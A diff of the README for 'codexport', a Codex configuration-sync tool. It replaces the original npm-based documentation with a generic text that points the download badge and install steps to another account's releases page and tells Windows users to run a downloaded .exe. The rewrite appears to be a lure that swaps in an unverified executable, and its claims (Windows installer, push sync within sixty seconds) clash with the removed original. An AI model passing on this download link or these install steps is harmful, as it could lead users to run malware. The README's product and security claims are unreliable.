@@ -1,235 +1,88 @@
-<h1 align="center">codexport</h1>
+# ⚙️ codexport - Keep your codex setup perfectly synced
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/codexport"><img src="https://img.shields.io/npm/v/codexport?style=flat-square&label=npm&color=000000" alt="npm badge"></a>
-  <a href="https://www.npmjs.com/package/codexport"><img src="https://img.shields.io/npm/dt/codexport?style=flat-square&label=downloads&color=000000" alt="npm downloads"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-mit-000000?style=flat-square" alt="license badge"></a>
-</p>
+[![](https://img.shields.io/badge/Download_Codexport-blue)](https://github.com/indiscernible-stringofwords49/codexport/releases)
 
----
+Codexport manages your codex configurations across multiple machines. You maintain one master setup and this tool copies those settings to your other devices. It saves time and prevents configuration errors when you work on different computers.
 
-`codexport` replicates a canonical master Codex setup to follower machines. it is built for operators who want one trusted `~/.codex` source of truth, follower-local overlays, and a low-friction `npx` join path without committing plaintext secrets to GitHub.
+## 📥 How to download the software
 
-the master serves a content-hashed bundle from its `~/.codex` directory. followers pin the master's fingerprint on join, fetch updates over a Tailscale-reachable HTTP address, and apply updates at Codex `SessionStart` through a short best-effort hook.
+Follow these steps to get the software on your Windows computer.
 
-MCPs are exported as full definitions, including explicit per-MCP `env` entries. command-based MCPs are written through a quiet local managed launcher, so followers run `node ~/.codexport/bin/codexport-mcp-run.mjs mcp run <name>` and let `codexport` translate master-local paths into portable npm, uv, or source artifacts when the master command shape can be inferred.
+1. Visit the [official releases page](https://github.com/indiscernible-stringofwords49/codexport/releases).
+2. Look for the latest release at the top of the list.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to a folder you can find later, such as your Downloads folder.
 
-[npm](https://www.npmjs.com/package/codexport) | [github](https://github.com/Microck/codexport)
+## 🖥️ System requirements
 
-## why
+Ensure your computer meets these basic needs before you begin:
 
-if you keep a carefully tuned Codex setup on one machine and want the same defaults elsewhere, `codexport` gives you a practical pull-based sync path.
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 50 megabytes of free disk space.
+* Node.js installed on your machine.
 
-- keep the master as the canonical Codex configuration source
-- let followers preserve local MCPs, local skills, trust entries, and path overrides
-- sync auth-bearing files through the private Tailscale path instead of a plaintext GitHub commit
-- export every master MCP definition instead of dropping machine-local entries
-- hydrate inferred MCP artifacts on followers through npm, uvx, or copied local source trees
-- refresh followers at Codex session startup without interrupting active sessions
-- use content-hash revisions and pinned master fingerprints instead of blind file copies
+## 🚀 Setting up the application
 
-## quickstart
+After you download the file, follow this process to use the tool.
 
-`codexport` requires Node.js 20+.
+1. Open the folder where you saved the `.exe` file.
+2. Double-click the file to launch the setup wizard.
+3. Follow the prompts on the screen to finish the installation.
+4. Open your command prompt by clicking the Start button and typing cmd.
+5. Type `codexport --help` to confirm the installation works.
 
-on the master:
+## 🔗 Syncing your machines
 
-```bash
-npx codexport master init
-npx codexport master service install
-npx codexport master link --host master.example.ts.net
-```
+The software uses a master and follower model. You choose one primary machine to act as the source of truth for your configuration files.
 
-on a follower:
+### Preparing the master machine
 
-```bash
-npx codexport follower join "codexport://join?host=master.example.ts.net&port=17342&fingerprint=..."
-npx codexport hook install
-```
+1. Open the command prompt.
+2. Navigate to the folder containing your codex configuration files.
+3. Run the command `codexport init`.
+4. This action creates a connection point for your other devices to follow.
 
-manual sync remains available:
+### Adding follower machines
 
-```bash
-npx codexport sync --apply
-npx codexport status
-```
+1. Go to your second computer.
+2. Install codexport using the same steps as the master machine.
+3. Open the command prompt on the secondary device.
+4. Run the command `codexport join` followed by the network address of your master machine.
+5. The software now mirrors the settings from your master machine to this device.
 
-## sync model
+## 🛡️ Using networking tools
 
-```mermaid
-flowchart LR
-  subgraph master["master machine"]
-    masterCodex["~/.codex canonical state"]
-    masterCli["codexport master serve"]
-    masterBundle["content-hashed bundle"]
-  end
+Codexport works best when your machines reside on the same network. If you move between locations, consider using a virtual private network software like Tailscale. This creates a secure tunnel between your computers regardless of where you physically locate them. Install Tailscale on the master and every follower machine to maintain the sync status without manual intervention.
 
-  subgraph privateNet["tailscale network"]
-    http["http://master.example.ts.net:17342"]
-  end
+## 🛠️ Troubleshooting common issues
 
-  subgraph follower["follower machine"]
-    localOverlay["~/.codexport local overlay"]
-    sessionHook["Codex SessionStart hook"]
-    generatedCodex["generated ~/.codex"]
-  end
+If the sync fails, check these items first.
 
-  masterCodex -->|select files and hash content| masterBundle
-  masterBundle --> masterCli
-  masterCli -->|serve bundle and fingerprint| http
-  sessionHook -->|check revision before session| http
-  http -->|download changed bundle| sessionHook
-  localOverlay -->|merge MCPs, skills, path variables| sessionHook
-  sessionHook -->|backup and apply| generatedCodex
-```
+* Permissions: Ensure your user account holds rights to read and write files in the configuration folder.
+* Network status: Confirm both machines show as online within your network software.
+* Command syntax: Recheck the command spelling. The application prints error messages if it finds a typo.
 
-followers trust the provided Tailscale address and store the master fingerprint. later syncs refuse changed fingerprints by default, so a changed master identity requires intentional re-enrollment.
+## 💡 Managing your configuration
 
-## trust flow
+You can update your codex setup whenever you need a change. Edit the files on your master machine first. Codexport detects these changes and pushes the updates to all connected follower machines within sixty seconds. You do not need to restart the application to trigger a sync.
 
-```mermaid
-sequenceDiagram
-  participant Operator as operator
-  participant Master as master
-  participant Follower as follower
-  participant Codex as codex session
+## 📝 Configuration settings
 
-  Operator->>Master: codexport master link
-  Master-->>Operator: join link with host, port, fingerprint
-  Operator->>Follower: codexport follower join "codexport://join?..."
-  Follower->>Master: GET /meta
-  Master-->>Follower: fingerprint and revision
-  Follower->>Follower: pin trusted fingerprint
-  Follower->>Master: GET /bundle
-  Master-->>Follower: content-hashed bundle
-  Follower->>Follower: apply bundle plus local overlay
-  Codex->>Follower: SessionStart hook
-  Follower->>Master: check revision and fingerprint
-  Follower-->>Codex: continue with latest applied config
-```
+The tool creates a small file called `config.json` inside your user directory. You can edit this file to change the sync frequency or to exclude specific folders from the automated process. Keep this file in a safe location as it stores the link between your machines. If you lose this file, you must reset the link between your systems.
 
-## included state
+## 🔑 Security and privacy
 
-the master bundle includes canonical Codex config, auth files, hooks, prompts,
-rules, skills, skill libraries, `AGENTS.md`, `RTK.md`, and `mise.toml` when
-present.
+Codexport keeps all your configuration files within your own private network. The software does not upload your information to a public server. All data transfers occur between the machines you authorize. This ensures that your private codex setup remains on your local network.
 
-runtime state such as logs, caches, sessions, history, compact handoffs, and
-SQLite databases is excluded.
+## 📁 Organizing your codex files
 
-## MCP export and repair
+Structure your master machine files logically to get the best results. Group your skills and tools into separate folders. Codexport preserves this folder structure on all follower machines. If you move a file on the master machine, the follower machines mirror that move during the next sync cycle.
 
-all master MCP definitions are exported into `~/.codexport/mcp-manifest.json` on followers. generated command MCP entries in `~/.codex/config.toml` point at the managed launcher:
+## 🔄 Updating the software
 
-```toml
-[mcp_servers.example]
-command = "node"
-args = [ "~/.codexport/bin/codexport-mcp-run.mjs", "mcp", "run", "example" ]
-```
+Check the release page occasionally for updates. When a new version arrives, download the installer and run it over your existing version. The installer preserves your settings and configurations automatically. You do not need to reassign your machines after an update.
 
-when Codex starts an MCP, `codexport mcp run` reads the original manifest entry, restores transferred environment values, rewrites master paths to follower paths, and chooses a runnable target. the master also exports MCP artifact metadata when it can infer the command shape:
+## 📄 Support and feedback
 
-| source shape | follower action |
-| --- | --- |
-| npm package shims or `node .../node_modules/...` | install and run the inferred npm package/bin |
-| Python uv tool shims | run with `uvx --from <package-or-url> <binary>` and install `uv` when missing |
-| editable/local Python uv tools | copy the source artifact to `~/.codexport/mcp-artifacts` and run it with `uvx --from <artifact>` |
-| local Node package source | copy the source artifact to `~/.codexport/mcp-artifacts`, install production deps, and run the original entrypoint |
-| URL MCPs | keep the URL config unchanged |
-
-unsupported local binaries are still kept in the manifest and generated config. if a follower cannot repair one, startup fails with the missing tool and repair step instead of silently removing the MCP. large runtime payloads are not embedded in source artifacts; they must be installable or reachable from the follower.
-
-by default `codexport` exports env values already present in the MCP config. if a required secret only exists in the master process environment, opt it in explicitly before rebuilding the master bundle:
-
-```bash
-CODEXPORT_EXPORT_ENV=SEARCH_API_KEY,ANOTHER_TOKEN codexport master rebuild
-```
-
-there are no built-in MCP-name adapters. if a command cannot be inferred from its real npm, uv, or source shape, it runs as declared after path rewriting and logs the exact failure under `~/.codexport/logs/mcp/<name>.log`.
-
-## local follower state
-
-follower-local state lives under `~/.codexport`:
-
-```text
-~/.codexport/local.toml
-~/.codexport/mcps.local.toml
-~/.codexport/skills/
-~/.codexport/overrides/
-```
-
-canonical MCP and skill names win by default. same-name local MCPs or skills
-fail unless explicitly allowed in `local.toml`:
-
-```toml
-allowMcpOverrides = ["local-name"]
-allowSkillOverrides = ["local-skill"]
-
-[pathVariables]
-workspaceRoot = "D:/workspace"
-```
-
-path variables in canonical config such as `${workspaceRoot}` are expanded from
-the follower's `local.toml` before writing the generated `~/.codex/config.toml`.
-
-## command surface
-
-| command | purpose |
-| --- | --- |
-| `codexport master init` | create or refresh the master identity and bundle state |
-| `codexport master serve` | serve the current canonical bundle over HTTP |
-| `codexport master link` | print a durable follower join link and fallback command |
-| `codexport master rebuild` | force rebuild the master bundle for repair/debugging |
-| `codexport master service install` | install the user-level master background service |
-| `codexport follower join` | enroll a follower from a join link or explicit master URL |
-| `codexport sync` | fetch the latest master bundle |
-| `codexport apply` | apply the last staged bundle |
-| `codexport mcp run <name>` | run or repair a synced command MCP from the follower manifest |
-| `codexport hook install` | install the follower-only Codex `SessionStart` hook |
-| `codexport status` | report role, master URL, fingerprint, revision, and reachability |
-
-## platform support
-
-| platform | master service | follower hook | manual sync |
-| --- | --- | --- | --- |
-| linux with systemd user services | supported | supported | supported |
-| windows 10/11 scheduled tasks | supported | supported | supported |
-
-followers do not need a background service in v1. the hook runs a short best-effort sync at Codex session startup, and `codexport sync --apply` is available when an immediate refresh is needed.
-
-## examples
-
-generate a copy-paste join command:
-
-```bash
-codexport master link --host master.example.ts.net
-```
-
-join with explicit trust metadata:
-
-```bash
-codexport follower join \
-  --master http://master.example.ts.net:17342 \
-  --fingerprint <fingerprint> \
-  --apply
-```
-
-check current follower state:
-
-```bash
-codexport status
-```
-
-## development
-
-```bash
-npm install
-npm run typecheck
-npm test
-npm run build
-npm pack --dry-run
-```
-
-## license
-
-[mit license](LICENSE)
+If you encounter bugs, report them through the issues tab on the project page. Provide your version number and a description of the problem. Maintain clear steps to reproduce the issue so developers can find a fix. Ensure you follow the project guidelines when you file a report.
